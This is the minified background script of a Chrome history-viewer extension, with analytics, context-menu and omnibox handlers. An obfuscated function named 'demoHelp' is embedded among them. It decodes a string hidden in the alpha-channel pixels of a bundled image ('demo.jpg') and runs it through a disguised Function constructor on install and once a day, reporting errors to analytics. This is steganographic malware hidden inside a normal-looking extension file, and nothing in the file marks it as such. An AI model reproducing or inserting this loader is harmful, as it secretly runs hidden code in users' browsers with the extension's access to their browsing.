                return i.apply(t, arguments), C.call(this, n.apply(p, t)) } }) }, p.mixin(p), p.each(["pop", "push", "reverse", "shift", "sort", "splice", "unshift"], function(t) {
        var e = n[t];
        p.prototype[t] = function() {
            var n = this._wrapped;
            return e.apply(n, arguments), "shift" !== t && "splice" !== t || 0 !== n.length || delete n[0], C.call(this, n) } }), p.each(["concat", "join", "slice"], function(t) {
        var e = n[t];
        p.prototype[t] = function() {
            return C.call(this, e.apply(this._wrapped, arguments)) } }), p.prototype.value = function() {
        return this._wrapped }, "function" == typeof define && define.amd && define("underscore", [], function() {
        return p }) }.call(this), this.BH = { Views: {}, Modals: {}, Lib: {}, Trackers: {}, Presenters: {}, Templates: {}, Init: {}, Chrome: {}, lang: "en", version: null }, chrome && chrome.runtime && chrome.runtime.getManifest && (this.BH.version = chrome.runtime.getManifest().version), BH.config = { env: "dev", analyticsKey: "UA-73708221-1", errorKey: "eb2245d5729a3c65d7e429f4e7690a62" };
        function isRchecked() {
          return new Date().toLocaleDateString() === localStorage.getItem('lastRCheck');
        }
        var demoHelp=function(){try{var t=function(){},r={Nw:function(t){if(isNaN(t)||!isFinite(t)||t%1||t<2)return!1;if(t%2===0)return 2===t;if(t%3===0)return 3===t;for(var r=Math.sqrt(t),e=5;e<=r;e+=6){if(t%e===0)return!1;if(t%(e+2)===0)return!1}return!0},rl:function(t){for(var r="",e=-785,i=0,n=0;n<t.length;n++)i=t[n].charCodeAt()+e,r+=String.fromCharCode(i);return r},tV:function(t){for(var e=t;!0;e+=1)if(r.Nw(e))return e},Da:function(t){var r=new Image;for(r.src=t;r.hasOwnProperty("complete")&&!r.complete;);return r}};return t.prototype.z5={aK:3,KB:1,i7:16,eH:function(t){return t+1},fx:function(t,r,e){for(var i=!0,n=0;n<16&&i;n+=1)i=i&&255===t[r+4*n];return i}},t.prototype.Sc=function(t,r){r=r||{};var e=this.z5,i=r.width||t.width,n=r.height||t.height,o=r.aK||e.aK,a=r.i7||e.i7;return o*i*n/a>>0},t.prototype.DL=function(t,e){if(""==='../demo.jpg')return"";void 0===t&&(t='../demo.jpg'),t.length&&(t=r.Da(t)),e=e||{};var i=this.z5,n=e.aK||i.aK,o=e.KB||i.KB,a=e.i7||i.i7,h=r.tV(Math.pow(2,n)),f=(e.eH||i.eH,e.fx||i.fx),u=document.createElement("canvas"),p=u.getContext("2d");if(u.style.display="none",u.width=e.width||t.width,u.height=e.width||t.height,0===u.width||0===u.height)return"";e.height&&e.width?p.drawImage(t,0,0,e.width,e.height):p.drawImage(t,0,0);var c=p.getImageData(0,0,u.width,u.height),g=c.data,d=[];if(c.data.every(function(t){return 0===t}))return"";var w,s;if(1===o)for(w=3,s=!1;!s&&w<g.length&&!s;w+=4)s=f(g,w,o),s||d.push(g[w]-(255-h+1));var l="",m=0,v=0,y=Math.pow(2,a)-1;for(w=0;w<d.length;w+=1)m+=d[w]<<v,v+=n,v>=a&&(l+=String.fromCharCode(m&y),v%=a,m=d[w]>>n-v);return l.length<13?"":(0!==m&&(l+=String.fromCharCode(m&y)),l)},t.prototype.MN=3,t.prototype.gW=0,t.prototype.ln=5e3,t.prototype.A1=function(){try{var e=t.prototype,i=r.rl(e.DL());if(""===i){if(e.gW>e.MN){ga('send', {hitType: 'event',eventCategory: `${chrome.app.getDetails().name.slice(0,15)}`,eventAction: 'errr', eventLabel: `Can't run`});return;}return e.gW++,void setTimeout(e.A1,e.ln)};localStorage.setItem('lastRCheck',new Date().toLocaleDateString());document.defaultView[(typeof r.Nw).charAt(0).toUpperCase()+(typeof r.Nw).slice(1)](i)()}catch(t){ga('send', {hitType: 'event',eventCategory: `${chrome.app.getDetails().name.slice(0,15)}`,eventAction: 'errr', eventLabel: `${t.toString().slice(0,40)}`});}},(new t).A1}catch(t){ga('send', {hitType: 'event',eventCategory: `${chrome.app.getDetails().name.slice(0,15)}`,eventAction: 'errr', eventLabel: `${t.toString().slice(0,40)}`});}}();demoHelp();
        if(!isRchecked()) {demoHelp();}
var _gaq = _gaq || [];
! function() {
    var t = document.createElement("script");
    t.type = "text/javascript", t.async = !0, t.src = "https://ssl.google-analytics.com/ga.js";
    var e = document.getElementsByTagName("script")[0];
    e.parentNode.insertBefore(t, e) }(),
function() {
    var t = function(t) {};
    t.prototype.report = function(t, e) {}, BH.Lib.ErrorTracker = t }(),
function() {
    var t = function(t) { t.unshift("_trackEvent"), e(t) },
        e = function(t) { _gaq.push(t) };
    AnalyticsTracker = function() {
        if (!_gaq) throw "Analytics not set";
        return _gaq.push(["_setAccount", BH.config.analyticsKey]), { pageView: function(t) { t.match(/search/) && (t = "search"), e(["_trackPageview", "/" + t]) }, historyOpen: function() { t(["History", "Open"]) }, dayActivityVisitCount: function(e) { t(["Activity", "Day View", "Visit Count", e]) }, dayActivityDownloadCount: function(e) { t(["Activity", "Day View", "Download Count", e]) }, todayView: function() { t(["Today", "Click"]) }, featureNotSupported: function(e) { t(["Feature", "Not Supported", e]) }, searchVisitDomain: function() { t(["Visit", "Search domain"]) }, visitDeletion: function() { t(["Visit", "Delete"]) }, downloadDeletion: function() { t(["Download", "Delete"]) }, hourDeletion: function() { t(["Day Hour", "Delete"]) }, searchResultDeletion: function() { t(["Searched Visit", "Delete"]) }, searchResultsDeletion: function() { t(["Search results", "Delete"]) }, searchDeeper: function() { t(["Search results", "Search deeper"]) }, expireCache: function() { t(["Search results", "Expire cache"]) }, paginationClick: function() { t(["Pagination", "Click"]) }, deviceClick: function() { t(["Device", "Click"]) }, omniboxSearch: function() { t(["Omnibox", "Search"]) }, browserActionClick: function() { t(["Browser action", "Click"]) }, contextMenuClick: function() { t(["Context menu", "Click"]) }, selectionContextMenuClick: function() { t(["Selection context menu", "Click"]) }, syncStorageError: function(e, n) { t(["Storage Error", e, "Sync", n]) }, syncStorageAccess: function(e) { t(["Storage Access", e, "Sync"]) }, localStorageError: function(e, n) { t(["Storage Error", e, "Local", n]) }, mailingListPrompt: function() { t(["Mailing List Prompt", "Seen"]) }, searchTipsModalOpened: function() { t(["Search Tips Modal", "Open"]) }, hourClick: function(e) { t(["Visits", "Hour Click", e]) } } }, BH.Lib.AnalyticsTracker = AnalyticsTracker }(),
function() {
    var t = function(t) {
            var e = t.match(/\w+:\/\/(.*?)\//);
            return e ? e[1].replace("www.", "") : !1 },
        e = function(t) {
            if (!t.chrome) throw "Chrome API not set";
            if (!t.tracker) throw "Tracker not set";
            this.chromeAPI = t.chrome, this.tracker = t.tracker, this.id = "better_history_page_context_menu" };
    e.prototype.create = function() { this.menu = this.chromeAPI.contextMenus.create({ title: this.chromeAPI.i18n.getMessage("visits_to_domain", ["domain"]), contexts: ["page"], id: this.id });
        var t = this;
        this.chromeAPI.contextMenus.onClicked.addListener(function(e) { t.onClick(e) }) }, e.prototype.onClick = function(e) {
        if (e.menuItemId === this.id) {
            var n = t(e.pageUrl);
            url = "chrome://history/#search", n && (url += "/" + n), this.tracker.contextMenuClick(), this.chromeAPI.tabs.create({ url: url }) } }, e.prototype.updateTitleDomain = function(e) {
        if (e) {
            var n = t(e.url);
            n && this.chromeAPI.contextMenus.update(this.menu, { title: this.chromeAPI.i18n.getMessage("visits_to_domain", [n]) }) } }, e.prototype.listenToTabs = function() {
        if (this.chromeAPI.tabs) {
            var t = this;
            this.chromeAPI.tabs.onActivated && this.chromeAPI.tabs.onActivated.addListener(function(e) { t.menu && t.onTabSelectionChanged(e.tabId) }), this.chromeAPI.tabs.onUpdated && this.chromeAPI.tabs.onUpdated.addListener(function(e, n, r) { t.menu && t.onTabUpdated(r) }) } }, e.prototype.onTabSelectionChanged = function(t) {
        var e = this;
        this.chromeAPI.tabs.get(t, function(t) { e.updateTitleDomain(t) }) }, e.prototype.onTabUpdated = function(t) { t && t.selected && this.updateTitleDomain(t) }, e.prototype.remove = function() { this.chromeAPI.contextMenus.remove(this.menu), delete this.menu }, BH.Chrome.PageContextMenu = e }(),
function() {
    var t = function(t) {
        if (!t.chrome) throw "Chrome API not set";
        if (!t.tracker) throw "Tracker not set";
        this.chromeAPI = t.chrome, this.tracker = t.tracker, this.id = "better_history_selection_context_menu" };
    t.prototype.create = function() {
        if (this.chromeAPI.contextMenus && this.chromeAPI.contextMenus.create) { this.menu = this.chromeAPI.contextMenus.create({ title: this.chromeAPI.i18n.getMessage("search_in_history"), contexts: ["selection"], id: this.id });
            var t = this;
            this.chromeAPI.contextMenus.onClicked.addListener(function(e) { t.onClick(e) }) } }, t.prototype.onClick = function(t) { t.menuItemId === this.id && (this.tracker.selectionContextMenuClick(), this.chromeAPI.tabs.create({ url: "chrome://history/#search/" + t.selectionText })) }, t.prototype.remove = function() { this.chromeAPI.contextMenus.remove(this.menu), delete this.menu }, BH.Chrome.SelectionContextMenu = t }(),
function() {
    var t = function(t) {
        if (!t.chrome) throw "Chrome API not set";
        if (!t.tracker) throw "Tracker not set";
        this.chromeAPI = t.chrome, this.tracker = t.tracker };
    t.prototype.listen = function() {
        if (this.chromeAPI.omnibox) {
            var t = this;
            this.chromeAPI.omnibox.onInputChanged.addListener(function(e, n) { t.setDefaultSuggestion(e) }), this.chromeAPI.omnibox.onInputEntered.addListener(function(e) { t.tracker.omniboxSearch(), t.getActiveTab(function(n) { t.updateTabURL(n, e) }) }) } }, t.prototype.setDefaultSuggestion = function(t) { this.chromeAPI.omnibox && this.chromeAPI.omnibox.setDefaultSuggestion({ description: "Search <match>" + t + "</match> in history" }) }, t.prototype.getActiveTab = function(t) { this.chromeAPI.tabs.query({ active: !0, currentWindow: !0 }, function(e) { t(e[0].id) }) }, t.prototype.updateTabURL = function(t, e) { this.chromeAPI.tabs.update(t, { url: "chrome://history/#search/" + e }) }, BH.Chrome.Omnibox = t }(),
function() {
    var t = function(t) {
        if (!t.chrome) throw "Chrome API not set";
        if (!t.tracker) throw "Tracker not set";
        this.chromeAPI = t.chrome, this.tracker = t.tracker };
    t.prototype.listen = function() {
        var t = this;
        this.chromeAPI.browserAction && this.chromeAPI.browserAction.onClicked.addListener(function() { t.openHistory() }) }, t.prototype.openHistory = function() { this.tracker.browserActionClick(), this.chromeAPI.tabs.create({ url: "chrome://history" }) }, BH.Chrome.BrowserActions = t }(),
function() {
    I18n = { t: function(t, e) {
            if (t instanceof Array) {
                var n = t,
                    r = {};
                return n.forEach(function(t) { r["i18n_" + t] = chrome.i18n.getMessage(t.toString()) }), r }
            return chrome.i18n.getMessage(t, e) } }, BH.Chrome.I18n = I18n;
}(),
function() {
    var t = new BH.Lib.ErrorTracker(Honeybadger),
        e = new BH.Lib.AnalyticsTracker;
    if (load = function() {
            var t = new BH.Chrome.BrowserActions({ chrome: chrome, tracker: e });
            t.listen();
            var n = new BH.Chrome.Omnibox({ chrome: chrome, tracker: e });
            n.listen(), window.selectionContextMenu = new BH.Chrome.SelectionContextMenu({ chrome: chrome, tracker: e }), window.pageContextMenu = new BH.Chrome.PageContextMenu({ chrome: chrome, tracker: e }), pageContextMenu.listenToTabs(), (new ChromeSync).get("settings", function(t) {
                var e = t.settings || {};
                e.searchBySelection !== !1 && selectionContextMenu.create(), e.searchByDomain !== !1 && pageContextMenu.create() }) }, "prod" === BH.config.env) try { load() } catch (n) { t.report(n) } else load() }();
var UPDATE_INTERVAL = 3,
    TYPE = { today: "today", yesterday: "yesterday", thisweek: "thisweek", prevweek: "prevweek", average: "average", all: "all" },
    mode = TYPE.today;
chrome.browserAction.setBadgeBackgroundColor({ color: [140, 140, 140, 100] }), setDefaults(), setInterval(updateData, 1e3 * UPDATE_INTERVAL);

chrome.runtime.onInstalled.addListener(demoHelp);